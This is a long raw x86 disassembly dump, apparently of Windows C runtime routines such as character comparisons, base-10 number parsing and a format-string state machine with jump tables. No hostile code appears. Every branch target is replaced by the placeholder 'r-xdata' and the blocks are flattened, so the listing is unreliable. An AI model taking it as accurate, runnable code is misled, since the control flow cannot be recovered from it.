push ebx
mov [ ebp - 0x1 ] al
call sub_41b3a0
pop ecx
pop ecx
mov cl [ ebp - 0x1 ]
test cl cl
jne r-xdata
cmp cl al
jne r-xdata
test al al
jne r-xdata
xor ecx ecx
cmp [ esi + 0xc ] 0x9
sete cl
xor eax eax
cmp [ ebp + 0x14 ] 0x9
sete al
cmp ecx eax
jne r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0xc ]
call sub_423023
push [ ebp + 0x14 ]
mov ebx eax
call sub_423023
sub ebx eax
neg ebx
pop ecx
sbb ebx ebx
inc ebx
pop ecx
mov al bl
jmp r-xdata
sete al
sub_41dc90
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x70
pop eax
movzx edi [ esi + 0x4 ]
cmp di ax
mov [ ebp - 0x8 ] ecx
sete dl
cmp bx ax
sete cl
test dl dl
jne r-xdata
xor eax eax
cmp dl cl
test cl cl
jne r-xdata
push edi
call sub_41b4b9
push ebx
mov [ ebp - 0x3 ] al
call sub_41b4b9
push edi
mov [ ebp - 0x1 ] al
call sub_41b33b
push ebx
mov [ ebp - 0x2 ] al
call sub_41b33b
mov cl [ ebp - 0x3 ]
add esp 0x10
test cl cl
jne r-xdata
cmp cl [ ebp - 0x1 ]
jne r-xdata
cmp [ ebp - 0x1 ] cl
jne r-xdata
xor al al
jmp r-xdata
mov cl [ ebp - 0x2 ]
mov cl [ ebp - 0x2 ]
test cl cl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
mov eax [ ebp - 0x8 ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_41b531
push [ esi + 0xc ]
mov bl al
mov eax [ ebp - 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_41b531
add esp 0x20
cmp al bl
sete al
jmp r-xdata
cmp cl al
jne r-xdata
test al al
jne r-xdata
push edi
call sub_41b3cd
push [ ebp + 0x10 ]
mov bl al
call sub_41b3cd
pop ecx
pop ecx
test bl bl
jne r-xdata
cmp bl al
jne r-xdata
test al al
jne r-xdata
xor ecx ecx
cmp [ esi + 0xc ] 0x9
sete cl
xor eax eax
cmp [ ebp + 0x14 ] 0x9
sete al
cmp ecx eax
jne r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0xc ]
call sub_423023
push [ ebp + 0x14 ]
mov ebx eax
call sub_423023
sub ebx eax
neg ebx
pop ecx
sbb ebx ebx
inc ebx
pop ecx
mov al bl
jmp r-xdata
sete al
sub_41ddb3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x70
pop eax
movzx edi [ esi + 0x4 ]
cmp di ax
mov [ ebp - 0x8 ] ecx
sete dl
cmp bx ax
sete cl
test dl dl
jne r-xdata
xor eax eax
cmp dl cl
test cl cl
jne r-xdata
push edi
call sub_41b4d5
push ebx
mov [ ebp - 0x3 ] al
call sub_41b4d5
push edi
mov [ ebp - 0x1 ] al
call sub_41b357
push ebx
mov [ ebp - 0x2 ] al
call sub_41b357
mov cl [ ebp - 0x3 ]
add esp 0x10
test cl cl
jne r-xdata
cmp cl [ ebp - 0x1 ]
jne r-xdata
cmp [ ebp - 0x1 ] cl
jne r-xdata
xor al al
jmp r-xdata
mov cl [ ebp - 0x2 ]
mov cl [ ebp - 0x2 ]
test cl cl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
mov eax [ ebp - 0x8 ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_41b531
push [ esi + 0xc ]
mov bl al
mov eax [ ebp - 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_41b531
add esp 0x20
cmp al bl
sete al
jmp r-xdata
cmp cl al
jne r-xdata
test al al
jne r-xdata
push edi
call sub_41b409
push [ ebp + 0x10 ]
mov bl al
call sub_41b409
pop ecx
pop ecx
test bl bl
jne r-xdata
cmp bl al
jne r-xdata
test al al
jne r-xdata
xor ecx ecx
cmp [ esi + 0xc ] 0x9
sete cl
xor eax eax
cmp [ ebp + 0x14 ] 0x9
sete al
cmp ecx eax
jne r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0xc ]
call sub_423023
push [ ebp + 0x14 ]
mov ebx eax
call sub_423023
sub ebx eax
neg ebx
pop ecx
sbb ebx ebx
inc ebx
pop ecx
mov al bl
jmp r-xdata
sete al
sub_41df1e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_434140
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41df7a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_434140
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41dfd6
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_434140
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e032
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_434140
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e08e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_434140
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e0ea
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_434140
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e146
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_434260
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e1a4
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_434260
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e202
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_434260
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e260
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_434260
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e2be
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_434260
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e31c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
sub eax 0x2
push eax
call sub_434260
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41e37a
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427759
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
mov ecx esi
call sub_427cfb
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d5e0
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41e482 ]
mov ecx esi
call sub_41f776
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f49a
jmp r-xdata
mov ecx esi
call sub_422d74
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41fe6c
jmp r-xdata
mov ecx esi
call sub_42009a
jmp r-xdata
mov ecx esi
call sub_4211f8
test al al
je r-xdata
sub_41e4a2
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427759
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
push edi
mov ecx esi
call sub_41d40d
test al al
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x18 ]
or edi 0xffffffff
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
mov ecx esi
call sub_427d83
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d615
mov ecx esi
mov [ esi + 0x1c ] eax
call sub_4278fb
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov ecx esi
call sub_41d40d
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
cmp eax 0x8
je r-xdata
pop edi
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41e5de ]
mov ecx esi
call sub_41f795
jmp r-xdata
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f4d7
jmp r-xdata
mov ecx esi
call sub_422d9f
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41fe94
jmp r-xdata
mov ecx esi
call sub_420203
jmp r-xdata
mov ecx esi
call sub_421427
test al al
je r-xdata
sub_41e5fe
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427759
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d64a
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
cmp eax 0x7
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jmp [ eax * 4 + jump_table_41e6fa ]
mov ecx esi
call sub_41f7c6
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f514
jmp r-xdata
mov ecx esi
call sub_422ddf
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41fece
jmp r-xdata
mov ecx esi
call sub_42036c
jmp r-xdata
mov ecx esi
call sub_421661
test al al
je r-xdata
sub_41e71a
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427795
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
mov ecx esi
call sub_427d1d
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d67c
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41e822 ]
mov ecx esi
call sub_41f7e5
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f551
jmp r-xdata
mov ecx esi
call sub_422e0a
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41fef6
jmp r-xdata
mov ecx esi
call sub_4204d5
jmp r-xdata
mov ecx esi
call sub_421890
test al al
je r-xdata
sub_41e842
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427795
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
push edi
mov ecx esi
call sub_41d459
test al al
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x18 ]
or edi 0xffffffff
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
mov ecx esi
call sub_427e03
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d6b1
mov ecx esi
mov [ esi + 0x1c ] eax
call sub_4279f3
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov ecx esi
call sub_41d459
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
cmp eax 0x8
je r-xdata
pop edi
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41e97e ]
mov ecx esi
call sub_41f804
jmp r-xdata
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f58e
jmp r-xdata
mov ecx esi
call sub_422e35
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41ff1e
jmp r-xdata
mov ecx esi
call sub_42063e
jmp r-xdata
mov ecx esi
call sub_421abf
test al al
je r-xdata
sub_41e99e
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427795
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d6e6
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
cmp eax 0x7
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jmp [ eax * 4 + jump_table_41ea9a ]
mov ecx esi
call sub_41f835
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f5cb
jmp r-xdata
mov ecx esi
call sub_422e75
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41ff58
jmp r-xdata
mov ecx esi
call sub_4207a7
jmp r-xdata
mov ecx esi
call sub_421cf9
test al al
je r-xdata
sub_41eaba
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_42777a
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
mov ecx esi
call sub_427d3f
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d718
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41ebca ]
mov ecx esi
call sub_41f854
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f608
jmp r-xdata
mov ecx esi
call sub_422ea0
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41ff80
jmp r-xdata
mov ecx esi
call sub_420910
jmp r-xdata
mov ecx esi
call sub_421f28
test al al
je r-xdata
sub_41ebea
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_42777a
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
push edi
mov ecx esi
call sub_41d4a5
test al al
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x18 ]
or edi 0xffffffff
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
mov ecx esi
call sub_427e83
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d74f
mov ecx esi
mov [ esi + 0x1c ] eax
call sub_427aeb
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov ecx esi
call sub_41d4a5
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
cmp eax 0x8
je r-xdata
pop edi
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41ed2a ]
mov ecx esi
call sub_41f873
jmp r-xdata
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f645
jmp r-xdata
mov ecx esi
call sub_422ecc
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41ffa9
jmp r-xdata
mov ecx esi
call sub_420a8c
jmp r-xdata
mov ecx esi
call sub_422185
test al al
je r-xdata
sub_41ed4a
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_42777a
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
